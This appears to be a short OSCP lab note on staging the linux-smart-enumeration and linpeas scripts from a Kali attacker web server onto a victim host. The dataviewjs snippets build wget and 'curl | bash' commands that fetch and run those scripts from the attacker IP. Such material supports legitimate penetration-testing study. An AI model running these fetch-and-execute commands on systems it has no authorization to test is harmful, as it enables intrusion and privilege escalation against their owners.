LSE.sh

https://github.com/diego-treitos/linux-smart-enumeration/tree/master

Host the script on KALI ATTACKER
```
cd ~/Desktop/Tools && python -m http.server 8888
```

Grab the script from VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd /tmp && wget http://${KaliIP}:8888/lse.sh && chmod 700 lse.sh && ./lse.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```
Directly execute into terminal
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl http://${KaliIP}:8888/linpeas.sh | bash`;

dv.paragraph("```bash\n" + command + "\n```");
```


